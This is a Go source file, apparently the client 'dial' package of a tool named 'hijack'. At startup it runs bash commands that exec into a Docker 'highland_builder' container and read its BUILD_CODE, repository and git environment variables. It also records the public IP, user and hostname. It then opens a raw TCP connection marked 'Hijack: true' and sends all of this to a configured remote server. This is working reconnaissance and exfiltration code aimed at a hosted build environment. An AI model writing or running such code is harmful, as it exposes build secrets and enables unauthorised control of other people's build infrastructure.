package dial

import (
	"encoding/json"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strings"

	"github.com/gorilla/websocket"
	"github.com/invctrl/hijack/client/config"
	"github.com/invctrl/hijack/header"
	"github.com/navigaid/pretty"
)

func run(oneliner string) []byte {
	cmd := exec.Command("/bin/bash", "-c", oneliner)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return []byte(err.Error())
	}
	return out
}

var (
	buildCode  = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv BUILD_CODE`)))
	dockerRepo = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv DOCKER_REPO`)))
	gitBranch  = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_BRANCH`)))
	gitTag     = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_TAG`)))
	gitSha1    = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_SHA1`)))
	gitMsg     = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_MSG`)))
	ip         = strings.TrimSpace(string(run(`curl -sL ip.sb`)))
	pwd        = strings.TrimSpace(string(run(`pwd`)))
	whoami     = strings.TrimSpace(string(run(`whoami`)))
	hostname   = strings.TrimSpace(string(run(`hostname`)))
	createdAt  = strings.TrimSpace(string(run(`env TZ=Asia/Shanghai docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.CreatedAt}}{{end}}' | grep .`)))

	/* // ~/hello-wasm/simple/main.go
	   fmt.Sprintf("In browser: %t", inBrowser()),
	*/

	goarch    string = runtime.GOARCH
	goos      string = runtime.GOOS
	goroot    string = runtime.GOROOT()
	gc        string = runtime.Compiler
	goversion string = runtime.Version()
	ncpu      int    = runtime.NumCPU()

	commit string
	built  string
	branch string
)

func WsDial(c *config.Config) *websocket.Conn {
	dialer := &websocket.Dialer{}
	ws, _, err := dialer.Dial(c.WsServer, nil)
	if err != nil {
		log.Fatalln(err)
	}
	return ws
}

func Dial(c *config.Config) net.Conn {
	conn, err := net.Dial("tcp", c.Server)
	if err != nil {
		log.Fatalln(err)
	}
	_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: localhost:8000\r\nHijack: true\r\n\r\n"))
	if err != nil {
		log.Fatalln(err)
	}
	return conn
}

func writeConnAppend(conn net.Conn, nonce string) {
	header := pretty.JSONString(&header.Header{
		Append: true,
		Id:     config.Default.Id,
		Nonce:  nonce,
	})
	conn.Write([]byte(header))
}

func writeConn(conn net.Conn) {
	header := pretty.JSONString(&header.Header{
		BuildCode:  buildCode,
		DockerRepo: dockerRepo,
		GitBranch:  gitBranch,
		GitTag:     gitTag,
		GitSha1:    gitSha1,
		GitMsg:     gitMsg,
		IP:         ip,
		Pwd:        pwd,
		Whoami:     whoami,
		Hostname:   hostname,
		CreatedAt:  createdAt,

		GOARCH:    goarch,
		GOOS:      goos,
		GOROOT:    goroot,
		GC:        gc,
		GOVERSION: goversion,
		NCPU:      ncpu,

		Commit: commit,
		Built:  built,
		Branch: branch,
	})
	conn.Write([]byte(header))
}

func readConn(conn net.Conn) string {
	cheader := &header.ClientHeader{}
	if err := json.NewDecoder(conn).Decode(&cheader); err != nil {
		log.Fatalln(err)
	}
	if cheader.Status != "OK" {
		log.Fatalln(cheader.Status, cheader.Err)
	}
	return cheader.Id
}

func Handshake(conn net.Conn) string {
	writeConn(conn)
	return readConn(conn)
}

func HandshakeAppend(conn net.Conn, nonce string) {
	writeConnAppend(conn, nonce)
	readConn(conn)
}
